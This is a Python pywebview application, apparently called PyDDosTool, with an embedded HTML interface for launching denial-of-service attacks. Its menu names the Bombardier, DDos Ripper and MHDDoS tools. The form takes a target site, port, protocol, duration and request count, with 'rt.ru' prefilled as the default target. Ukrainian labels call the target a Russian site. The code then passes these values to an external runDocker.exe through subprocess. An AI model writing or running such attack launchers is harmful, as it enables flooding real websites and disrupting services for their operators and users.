import webview
import subprocess
global process

html = """<!DOCTYPE html>
<html><head>
  <meta name="viewport" content="width=device-width, initial-scale=1 " charset="utf-8">
</head><body>
<style>
  body {
    background: #1B1919; /* Цвет фона */
    color: #fff; /* Цвет текста */
}
.toolbar {
    position: absolute;
    top: 0px;
    left: 0px
    z-index: 0;
}
#tBox{
position: absolute;
    top: 245px;
    left: 0px;
    width: 500px;
    height: 55px;
    background-color: #2E2A2A;
}
.tBox2{
position: absolute;
    top: 0px;
    left: 0px;
    width: 55px;
    height: 300px;
    background-color: #2E2A2A;
    z-index: 4;
}
#tBox4{
position: absolute;
    top: 0px;
    left: 0px;
    width: 55px;
    height: 300px;
    background-color: #2E2A2A;
    z-index: 3;
}
#tCircle{
    position: absolute;
    top: 218px;
    left: 55px;
    width: 27px;
    height: 27px;
    background-color: #1B1919;
    border-radius: 50%;
    z-index: 1;
}
#tBox3{
position: absolute;
    top: 232px;
    left: 55px;
    width: 13px;
    height: 14px;
    background-color: #2E2A2A;
    z-index: 0;
}

.container {
    position: absolute;
    top: 13px;
    left: 13px;
    display: inline-block;
    cursor: pointer;
    z-index: 5;
}
.bar1, .bar2, .bar3 {
    width: 25px;
    height: 3px;
    background-color: #fff;
    margin: 3px 0;
    transition: 0.4s;
    border-radius: 5px;
    z-index: 7;
}
.change .bar1 {
    -webkit-transform: rotate(-45deg) translate(-5px, 3px);
    transform: rotate(-45deg) translate(-5px, 3px);

}
.change .bar2 {opacity: 0;}


.change .bar3 {
    -webkit-transform: rotate(45deg) translate(-4px, -4px);
    transform: rotate(45deg) translate(-4px, -4px);
}
.menu{
    position: absolute;
    top: 0px;
    left: -145px;
    z-index: 3;
}
#mBox{
    position: relative;
    width: 200px;
    height: 250px;
    background-color: #2E2A2A;
}
#mCircle{
    position: absolute;
    top: 218px;
    left: 200px;
    width: 27px;
    height: 27px;
    background-color: #1B1919;
    border-radius: 50%;
    z-index: 1;
}
#mBox2{
position: absolute;
    top: 232px;
    left: 200px;
    width: 13px;
    height: 14px;
    background-color: #2E2A2A;
}

@keyframes slidein {
  from {
    margin-left: 0px;
  }
  to {
    margin-left: 150px;
  }
}
@keyframes slideout {
  from {
    margin-left: 150px;
  }

  to {
    margin-left: 0px;
  }
}
@keyframes dissolveOff {
  from {
    opacity: 100%;
  }

  to {
    opacity: 0%;
  }
}
@keyframes dissolveOn {
  from {
        opacity: 0%;
  }

  to {
        opacity: 100%;
  }
}
.getOff{
  animation: dissolveOff 500ms ;
  animation-fill-mode: forwards;

}
.getOn{
  animation: dissolveOn 500ms ;
  animation-fill-mode: both;
    animation-delay: 500ms;

}
.menuOpen {
  animation: slidein 1s ;
  animation-fill-mode: forwards;
}
.menuClose {
  animation: slideout 1s ;
  animation-fill-mode: forwards;
}
.action{
    position: absolute;
    top: 252px;
    left: 70px;
    z-index: 5;
}




Button.button{
    position: absolute;
    top: 0px;
    left: 0px;
    border: none;
    border-radius: 5px;
    padding: 10px 30px;
    font-size: 18px;
    background-color: #2E2A2A;
    color: #C4C4C4;
}
Button.button:hover {background-color: #414141;}
Button.button:active {
background-color: #2E2A2A;
color: #FFFFFF;
}
Button.menuButton{
    position: absolute;
    left: -55px;
    border: none;
    padding: 5px 30px;
    font-size: 14px;
    background-color: #2E2A2A;
    color: #C4C4C4;
    width: 255px;
    height: 45px;
    text-align: right;
}
Button.menuButton:hover {background-color: #414141;}
Button.menuButton:active {
background-color: #2E2A2A;
color: #FFFFFF;
}

#stop{
top: 0px;
left: 0px;
font-size: 18px;
}
#stop{
top: 0px;
left: 320px;
font-size: 18px;
}

#docker{top: 45px;}
#ripper{
top: 90px;
}
#mhddos{
top: 135px;
}
#setting{
top: 180px;

}
#about{
position: absolute;
top: 20px;
left: 135px;
font-size: 14px;
cursor: pointer;
z-index: 50;
color: #C4C4C4;
}


.Docker{
position: absolute;
top: 10px;
left: 70px;
z-index: 2;
}
#DockerSiteText{
position: absolute;
top: 0px;
left: 5px;
}
#DockerSite{
position: absolute;
top: 40px;
left: 0px;
height: 12px;
}
#DockerPort{
position: absolute;
top: 40px;
left: 105px;
}
#DockerCod{
position: absolute;
top: 40px;
left: 255px;
}
#DockerPortText{
position: absolute;
top: 0px;
left: 110px;
}
#DockerCodText{
position: absolute;
top: 0px;
left: 260px;
}
#DockerTimeText{
position: absolute;
top: 50px;
left: 0px;
}
#DockerTime{
position: absolute;
top: 90px;
left: 0px;
height: 12px;
}
#DockerTimeType{
position: absolute;
top: 90px;
left: 105px;
}
#DockerRequestText{
position: absolute;
top: 100px;
left: 0px;
}
#DockerRequest{
position: absolute;
top: 140px;
left: 0px;
height: 12px;
}

@keyframes DockerOff {
  from {
        opacity: 100%;
  }

  to {
        opacity: 0%;
  }
}
.DockerClose{
  animation: DockerOff 500ms ;
  animation-fill-mode: forwards;
  z-index: 0;
}
@keyframes DockerOn {
  from {
        opacity: 0%;
  }

  to {
        opacity: 100%;
  }
}
.DockerOpen{
  animation: DockerOn 500ms ;
  animation-fill-mode: forwards;
  z-index: 2;
}
.helpme{
position: absolute;
left: 160px;
top: 60px;
width: 200px;
height: 50px;
opacity: 0%;
}
#helptexturl{
position: absolute;
left: 55px;
top: 70px;
}
</style>
<div class="tollbar">
  <div id="tBox"></div>
  <div class="tBox2"></div>
  <div id="tCircle"></div>
  <div id="tBox3"></div>
  <div id="tBox4"></div>
</div>

<div class="menu">
  <div id="mBox"></div>
  <div id="mCircle"></div>
  <div id="mBox2"></div>
  <button class="menuButton" onclick="menuClose(); OpenDocker(); CloseHelpme();" id="docker" >Apline / Bombadier</button>
  <button class="menuButton" onclick="menuClose(); CloseDocker(); OpenHelpme();" id="ripper" >DDos Ripper</button>
  <button class="menuButton" onclick="menuClose(); CloseDocker(); OpenHelpme();" id="mhddos" >MHDDoS</button>
  <button class="menuButton" onclick="menuClose(); CloseDocker(); OpenHelpme();" id="setting" >Setting</button>
  <a href="https://github.com/salivo/PyDDosTool" id="about" target="_blank" onclick="menuClose()">About</a>
</div>
  <div class="container" onclick="menuFunction()">
    <div class="bar1"></div>
    <div class="bar2"></div>
    <div class="bar3"></div>
  </div>
<div class="action">
  <button class="button" id="stop" onclick="menuClose(); StopDocker();" >Stop</button>
  <button class="button"id="start" onClick="menuClose(); StartDocker();">Start</button>
</div>

<div class="Docker">
  <p id="DockerSiteText"><nobr>Сайт / IP</nobr></p>
  <input type="text" class="DockerIn" id="DockerSite" minlength="4" maxlength="30" size="10" value="rt.ru">
  <p id="DockerPortText">Порт</p>
  <select class="DockerIn" id="DockerPort">
    <option value="NONE">NONE</option>
    <option value="80">80 http</option>
    <option value="443">443 https</option>
    <option value="443">110 pop3</option>
    <option value="143">143 imap</option>
    <option value="465">465 smtps</option>
    <option value="587">587 submission</option>
    <option value="993">993 imaps</option>
    <option value="995">995 pop3s</option>
    <option value="3389">3389 ms-wbt-server</option>
    <option value="5432">5432 postgresql</option>
    <option value="5900">5900 vnc</option>
    <option value="8080">8080 http-proxy</option>
    <option value="8081">8081 blackice-icecap</option>
    <option value="9100">9100 jetdirect</option>
  </select>
  <p id="DockerCodText">Протокол</p>
  <select class="DockerIn" id="DockerCod">
    <option value="NONE">NONE</option>
    <option value="TCP">TCP</option>
    <option value="UDP">UDP</option>
    <option value="TCP/UDP">TCP/UDP</option>
  </select>
  <p id="DockerTimeText"><nobr>Час на атаку</nobr></p>
  <input type="text" class="DockerIn" id="DockerTime" minlength="4" maxlength="30" size="10" value="1800">

  <select class="DockerIn" id="DockerTimeType">
    <option value="seconds">seconds</option>
    <option value="minutes">minutes</option>
    <option value="hours">hours</option>
    <option value="days">days</option>
  </select>
  <p id="DockerRequestText"><nobr>Кількість запитів</nobr></p>
  <input type="text" class="DockerIn" id="DockerRequest" minlength="4" maxlength="30" size="10" value="5000">
</div>
<div class="helpme">
  <p id="helptext">В Розробці: Доступно тільки: Apline / Bombadier. Допомогти з розробкою можна: </p>
  <a id="helptexturl" href="https://t.me/andrysaliv" target="_blank">тут</a>
</div>
<script>var i = 0;
var AttackType = 1;
function menuFunction() {

if(i == 0){
    document.querySelector(".menu").classList.add("menuOpen");
    document.querySelector(".menu").classList.remove("menuClose");
    document.querySelector(".container").classList.add("change");
    document.querySelector(".tBox2").classList.add("getOff");
    document.querySelector(".tBox2").classList.remove("getOn");
    i = 1;
    }
else{
    document.querySelector(".menu").classList.remove("menuOpen");
    document.querySelector(".menu").classList.add("menuClose");
    document.querySelector(".tBox2").classList.remove("getOff");
    document.querySelector(".tBox2").classList.add("getOn");
    document.querySelector(".container").classList.remove("change");
    i = 0;
    }
}
function menuClose(){
if(i == 1){
    document.querySelector(".menu").classList.remove("menuOpen");
    document.querySelector(".menu").classList.add("menuClose");
    document.querySelector(".tBox2").classList.remove("getOff");
    document.querySelector(".tBox2").classList.add("getOn");
    document.querySelector(".container").classList.remove("change");
    i = 0;
    }
}

function OpenDocker(){
document.querySelector(".Docker").classList.add("DockerOpen");
document.querySelector(".Docker").classList.remove("DockerClose");
AttackType = 1;
}
function CloseDocker(){
document.querySelector(".Docker").classList.add("DockerClose");
document.querySelector(".Docker").classList.remove("DockerOpen");
}






function OpenHelpme(){
document.querySelector(".helpme").classList.add("DockerOpen");
document.querySelector(".helpme").classList.remove("DockerClose");
AttackType = 0;
}
function CloseHelpme(){
document.querySelector(".helpme").classList.add("DockerClose");
document.querySelector(".helpme").classList.remove("DockerOpen");
}
function StartDocker() {
    if(AttackType == 1){
    pywebview.api.StartDocker(document.querySelector("#DockerSite").value, document.querySelector("#DockerPort").value, document.querySelector("#DockerCod").value, document.querySelector("#DockerTime").value, document.querySelector("#DockerTimeType").value, document.querySelector("#DockerRequest").value);
    }
}
function StopDocker() {
if(AttackType == 1){
pywebview.api.StopDocker();
}
}</script></body></html>"""
class Api:
    def StartDocker(self, site, port, protocol, timing, timetype, request):
        global process
        print(site + port + protocol + timing + timetype[0] + request)
        if port != "NONE":
            site = site + ":" + port
        if protocol == "TCP/UDP":
            site = site + "/udptcp"
        if protocol != "NONE":
            site = site + "/" + protocol

        print("З такими параметрами:")
        print("Сайт рашки: " + site + " " + protocol + ", час на атаку: " + timing + " " + timetype[
            0] + ", кількість запитів: " + request)
        print("")

        DockerCode = " %s %s %s" % (site, request, timing + timetype[0])
        process = subprocess.Popen(['start', 'data/runDocker.exe', site, request, timing + timetype[0]], shell=True)
        window.show()

    def StopDocker(self):
        print("stop")
        subprocess.Popen(['taskkill', '/IM', 'runDocker.exe', '/T', '/F'])


api = Api()

window = webview.create_window('PyDDosTool', html=html, width=512, height=346, resizable=False, js_api=api,
                               on_top=True, confirm_close=True)
webview.start()

